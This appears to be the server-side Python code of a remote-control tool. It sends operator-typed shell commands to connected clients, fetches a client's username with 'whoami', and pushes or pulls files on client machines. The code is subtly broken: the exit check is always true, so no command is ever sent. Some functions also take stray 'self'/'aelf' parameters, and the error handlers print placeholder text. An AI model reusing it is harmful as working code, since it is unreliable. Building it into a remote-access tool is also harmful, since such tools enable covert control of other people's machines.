#!/bin/python3
'''
Author: Gal Davidi
'''

import os
import logging
import logging.config
import fileReader
import hashlib

BUFFER = 1024
END_MSG = b'exit'
CODING = "utf-8"
CONN_TEST = b' '
BIG_BUFFER = 65536
TRUE = 1
FALSE = 0
BACK_TO_STRESS = 'back'
USERNAME_CMD = b'whoami'
LOGGER_CONF_PATH = "../conf/logger.conf"
GET_FILE_TRIGER = b'get'
PUT_FILE_TRIGER = b'put'


def get_client_username(self, connection):
    '''
    get username using the 'whoami' command
    '''
    try:
        connection.sendall(USERNAME_CMD)
        username = connection.recv(BUFFER).decode(CODING)
        return username
    except:
        print("could not get the username")
        return "unknown"


def command_sender(self, connection):
    '''
    send command to the client
    '''
    while True:
        try:
            command = input().encode(CODING)
            if command == END_MSG or BACK_TO_STRESS:
                break
            connection.sendall(command)
            data = connection.recv(BUFFER)
            print(f'{data.decode(CODING)}', end='')
        except ConnectionResetError as err:
            print(err)


def dir_creator(aelf, client_name):
    '''generate dir based on the client name'''
    try:
        os.makedirs(f"./clients/{client_name}")
    except OSError as err:
        print(err)


def put_file(remote_path, local_path, connection):
    '''upload file to the client'''
    try:
        connection.sendall(GET_FILE_TRIGER)
        connection.sendall(remote_path)
        with open(local_path, 'rb') as file:
            data = file.read(BUFFER)
            while data:
                connection.send(data)
                data = file.read(BUFFER)
    except:
        print("LOG")


def get_file(local_path, remote_path, connection):
    '''get file from the client'''
    try:
        connection.sendall(PUT_FILE_TRIGER)
        connection.sendall(remote_path)
        with open(local_path, 'wb') as file:
            while True:
                data = connection.recv(BUFFER)
                if not data:
                    break
                file.write(data)
    except:
        print("LOGGGGGG")
